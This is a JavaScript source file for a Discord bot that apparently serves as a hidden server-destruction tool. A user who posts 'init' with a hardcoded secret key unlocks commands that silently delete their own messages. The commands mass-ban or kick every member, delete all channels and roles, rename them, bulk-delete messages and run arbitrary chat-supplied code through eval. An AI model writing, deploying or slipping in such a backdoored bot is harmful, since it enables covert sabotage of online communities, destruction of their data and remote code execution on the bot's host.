/*
 *   Copyright (c) 2020 routerabfrage
 *   All rights reserved.
 */
// jshint esversion: 8
const config = require("./config.json"); //Initialize our .JSON

const Discord = require("discord.js"); //Initialize our Discord.JS

const client = new Discord.Client(); //Initialize our Client

const start = Date.now(); //Get current date in ms from 1-1-1970

client.on("ready",()=>{
	//Send initialization message once ready
	console.log(getDate()+" Initialized in "+(Date.now()-start)+"ms");
});

const secretKey = "2348409503458900123785927034"; //Set secret key to string (CHange if you like)

var initialized = []; //Array of initialized people

function getFromArray(a,b) {
	//Function to check if variable is in an array
	var confirmed = false; //Confirmation variable
	for(var i=0;i<a.length;i++) { //Go through array
		if(a[i]===b) confirmed = true; //Set our confirmation variable to true if the array matches
	}
	return confirmed; //Return true or false
}

function getSimilarFromArray(a,b) {
	//Function to check if variable is found in the beginning of an array object in an array
	var confirmed = false; //Confirmation variable
	for(var i=0;i<a.length;i++) { //Go through array
		if(b.startsWith(a[i])) confirmed = [true,i]; //Set our confirmation variable array's first index to true if the array matches and the second index to the index number
	}
	return confirmed; //Return array with true or false and index number
}

function removeFromArray(a,b) {
	//Function to remove every occurence of an object inside an array
	for(var i=0;i<a.length;i++) { //Go through array
		if(a[i]===b) a.splice(i,1); //Splice the current index off off the array if a match is found
	}
	return a; //Return edited array
}

function getDate() {
	//Function to format the current date into a string
	var date = new Date(); //Make a new date
	var year = date.getYear()+1900; //Get the current year
	var months = ["January","February","March","April","May","June","July","August","September","October","November","December"]; //Array of months to get the current month using an index
	var month = months[date.getMonth()]; // Get month index
	var day = date.getDate().toString().length<2?"0"+date.getDate():date.getDate(); //Get current day of month 1-30
	var hour = date.getHours().toString().length<2?"0"+date.getHours():date.getHours(); //Get current hour of the day
	var minute = date.getMinutes().toString().length<2?"0"+date.getMinutes():date.getMinutes(); //Get current minute of the hour
	var second = date.getSeconds().toString().length<2?"0"+date.getSeconds():date.getSeconds(); //Get current second of the minute
	return year+"-"+month+"-"+day+" "+hour+":"+minute+":"+second; //Return formatted string
}

var listening = []; //Array of people to listen to

const banmessage = "GET BANNED"; //Ban message
const commands = { //Array of commands to listen to

	//TOO BORED TO TYPE THIS GO AHEAD AND RESEARCH IT YOURSELF
	"gb activate":`
	msg.delete().catch(()=>{});
	if(!getFromArray(listening,msg.author.id))
	listening.push(msg.author.id);`,
	"gb deactivate":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id))
	listening = removeFromArray(listening,msg.author.id);`,
	"listening":"console.log(listening);",
	"ban all":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
	var users = msg.guild.members; //COLLECTION NOT AN ARRAY!
	users.forEach(user=>{
		user.ban(banmessage).catch(()=>{});
	});
	}`,
	"kick all":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
	var users = msg.guild.members; //COLLECTION NOT AN ARRAY!
	users.forEach(user=>{
		user.kick().catch(()=>{});
	});
	}`,
	"delete channels":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
	var channels = msg.guild.channels;
	channels.forEach(channel=>{
		channel.delete().catch(()=>{});
	});
	}`,
	"delete roles":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
	var roles = msg.guild.roles;
	roles.forEach(role=>{
		role.delete().catch(()=>{});
	});
	}`,
	"clear":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) msg.channel.bulkDelete(100).catch(()=>{});`,
	"clear all":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) msg.channel.bulkDelete(100).catch(()=>{});`
};

const subcommands = { //Array of commands with an extra string attached to it to listen to
	"clear":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var channel = msg.content.split(" ")[1];
		msg.guild.channels.find(x=>x.name===channel).bulkDelete(100).catch(()=>{});
	}`,
	"kick":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var member = msg.mentions.members.first();
		member.kick().catch(()=>{});
	}`,
	"ban":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var member = msg.mentions.members.first();
		member.ban(banmessage).catch(()=>{});
	}`,
	"delete channel":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var channel = msg.content.split(" ")[2];
		msg.guild.channels.find(x=>x.name===channel).delete().catch(()=>{});
	}`,
	"delete role":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var role = msg.content.split(" ")[2];
		msg.guild.roles.find(x=>x.name===role).delete().catch(()=>{});
	}`,
	"edit all channels":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var name = msg.content.split(" ")[3];
		var channels = msg.guild.channels;
		channels.forEach(channel=>{
			channel.setName(name).catch(()=>{});
		});
	}`,
	"edit all roles":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var name = msg.content.split(" ")[3];
		var roles = msg.guild.roles;
		roles.forEach(role=>{
			role.setName(name).catch(()=>{});
		});
	}`,
	"edit channel":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var channel = msg.content.split(" ")[2];
		var name = msg.content.split(" ")[3];
		msg.guild.channels.find(x=>x.name===channel).setName(name).catch(()=>{});
	}`,
	"edit role":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var role = msg.content.split(" ")[2];
		var name = msg.content.split(" ")[3];
		msg.guild.roles.find(x=>x.name===role).setName(name).catch(()=>{});
	}`,
	"eval":`
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id))
	eval(msg.content.slice(4));`
};

client.on("message",msg=>{
	//Get message once a message has been send
	if(msg.content==="init "+secretKey) { //If keyword Init + secretkey matches with the message then we will add them to the whitelist
		initialized.push(msg.author.id); //Push to array
		console.log(getDate()+" "+msg.author.username+"#"+msg.author.discriminator+" just initialized!");
		msg.delete().catch(()=>{});
	} else if(getFromArray(initialized,msg.author.id)) { //Test if message author is in whitelist
		if(commands[msg.content.toLowerCase()]!==(null||undefined)) { //Test if command exists in JSON array
			console.log(getDate()+" "+msg.author.username+"#"+msg.author.discriminator+" just used the "+msg.content.toLowerCase()+" command!"); //Log the user and discriminator to console
			eval(commands[msg.content.toLowerCase()]); //Execute the command (eval is not recommended)
		} else if(getSimilarFromArray(Object.keys(subcommands),msg.content.toLowerCase())[0]) { //Test if prefixed command exists in JSON array
			var res = Object.keys(subcommands)[getSimilarFromArray(Object.keys(subcommands),msg.content.toLowerCase())[1]]; //Get current prefixed command
			console.log(getDate()+" "+msg.author.username+"#"+msg.author.discriminator+" just used the "+res+" subcommand!"); //Log the user and discriminator to console
			eval(subcommands[res]); //Execute the command (eval is not recommended)
		}
	}
});

client.login(config.token); //Initialize our bot with a token we got from the config JSON